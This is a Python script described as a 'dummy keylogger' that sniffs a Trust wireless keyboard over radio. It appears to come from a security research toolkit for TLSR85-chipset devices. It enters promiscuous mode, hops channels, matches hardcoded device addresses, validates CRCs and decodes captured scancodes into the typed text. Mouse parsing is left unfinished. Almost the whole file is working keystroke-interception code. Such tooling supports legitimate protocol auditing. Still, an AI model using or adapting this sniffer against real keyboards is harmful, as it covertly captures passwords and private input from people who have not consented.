#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Dummy keylogger for the Trust keyboard, also detects Trust mouse but doesn't parse it yet
# Address of keyboard and mouse are hardcoded

import time

from binascii import unhexlify
from lib import common
from tools.devices.TLSR85.tlsr85 import Tlsr85
from tools.devices.TLSR85.tlsr85_keyboard import Tlsr85Keyboard
from tools.devices.TLSR85.tlsr85_mouse import Tlsr85Mouse

# TODO add flags (shift, alt, win, ...)
SCANCODE = {
    "20": "a",
    "26": "z",
    "8": "e",
    "21": "r",
    "23": "t",
    "28": "y",
    "24": "u",
    "12": "i",
    "18": "o",
    "19": "p",
    "4": "q",
    "22": "s",
    "7": "d",
    "9": "f",
    "10": "g",
    "11": "h",
    "13": "j",
    "14": "k",
    "15": "l",
    "51": "m",
    "29": "w",
    "27": "x",
    "6": "c",
    "25": "v",
    "5": "b",
    "17": "n",
    "30": "&",
    "31": "é",
    "32": "\"",
    "33": "\'",
    "34": "(",
    "35": "§",
    "36": "è",
    "37": "!",
    "38": "ç",
    "39": "à",
    "89": "1",
    "90": "2",
    "91": "3",
    "92": "4",
    "93": "5",
    "94": "6",
    "95": "7",
    "96": "8",
    "97": "9",
    "98": "0",
    "0": ""
}

common.init_args('./tlsr85-sniffer.py')
common.parse_and_init()

trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80",22, 0x11021, 0x24bf, 2)
trust_mouse = Tlsr85Mouse("4a:b4:cb", "dc",30, 0x11021, 0x24bf, 2)
# base address for poss : "d5:54:cb"
# crc init for poss: 0xcb01

rate = Tlsr85.RATE
common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=rate)

# Sweep through the channels
channels = Tlsr85.CHANNELS
channel_index = 0
common.radio.set_channel(channels[channel_index])


# Convert dwell time from milliseconds to seconds
dwell = 200
dwell_time = dwell / 1000

entered_string = ""
last_tune = time.time()

while True:
    # Increment the channel after dwell_time
    if len(common.channels) > 1 and time.time() - last_tune > dwell_time:
        channel_index = (channel_index + 1) % (len(channels))
        common.radio.set_channel(channels[channel_index])
        last_tune = time.time()

    value = common.radio.receive_payload()
    if len(value) >= Tlsr85.BASE_ADDRESS_LENGTH:
        found_address = bytes(value[Tlsr85.BASE_ADDRESS_LENGTH:Tlsr85.FULL_ADDRESS_LENGTH]).hex()

        if found_address == trust_keyboard.keyboard_address:
            packet = trust_keyboard.parse_packet(value)
            if trust_keyboard.check_crc(packet["payload"], packet["crc"]):
                print(f"Keyboard packet\tCHANNEL : {channels[channel_index]}\n")
                for items in packet["array"]:
                    if items in SCANCODE:
                        entered_string += SCANCODE[items]
                print(entered_string)
                last_tune = time.time()

        elif found_address == trust_mouse.mouse_address:
            # TODO check the CRC and parse the input
            t = ''
            """ print(f"CHANNEL : {channels[channel_index]}\n")
            last_tune = time.time() """

